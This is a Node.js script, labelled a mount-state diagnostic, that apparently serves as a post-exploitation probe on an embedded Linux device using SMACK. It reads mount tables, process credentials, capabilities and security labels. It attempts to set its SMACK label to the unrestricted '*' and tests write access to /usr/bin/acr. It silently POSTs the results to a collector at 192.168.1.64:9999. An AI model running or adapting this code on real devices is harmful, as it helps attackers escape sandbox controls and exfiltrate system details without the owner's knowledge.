"use strict";
// audit89.js - diagnose mount state after remount broke exec. Read /proc/mounts via fs.
var fs = require("fs");
var http = require("http");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

try { out.mounts = fs.readFileSync("/proc/mounts", "utf8"); } catch (e) { out.mounts = "ERR " + e.message; }
try { out.self_mounts = fs.readFileSync("/proc/self/mounts", "utf8"); } catch (e) { out.self_mounts = "ERR " + e.message; }
try { out.self_status = fs.readFileSync("/proc/self/status", "utf8").split("\n").filter(function (l) { return l.indexOf("Uid") === 0 || l.indexOf("Gid") === 0 || l.indexOf("Cap") === 0 || l.indexOf("NoNewPrivs") === 0 || l.indexOf("Seccomp") === 0; }).join(" | "); } catch (e) { out.self_status = "ERR " + e.message; }
try { out.smack = fs.readFileSync("/proc/self/attr/current", "utf8"); } catch (e) { out.smack = "ERR " + e.message; }
try { out.smackfs = fs.readFileSync("/proc/self/attr/smack/current", "utf8"); } catch (e) { out.smackfs = "ERR " + e.message; }

// try writing SMACK label to star (unrestricted)
try { fs.writeFileSync("/proc/self/attr/current", "*"); out.smack_write = "OK"; } catch (e) { out.smack_write = "ERR " + e.message; }

// can we read /usr/bin/acr?
try { var fd = fs.openSync("/usr/bin/acr", "r"); fs.closeSync(fd); out.acr_read = "OK"; } catch (e) { out.acr_read = "ERR " + e.message; }
// can we write?
try { var fd2 = fs.openSync("/usr/bin/acr", "r+"); fs.closeSync(fd2); out.acr_write = "OK"; } catch (e) { out.acr_write = "ERR " + e.message; }

// check /bin/sh
try { var fd3 = fs.openSync("/bin/sh", "r"); fs.closeSync(fd3); out.sh_read = "OK"; } catch (e) { out.sh_read = "ERR " + e.message; }

post("/p89_diag", out);
post("/p89_done", { started: out.started });
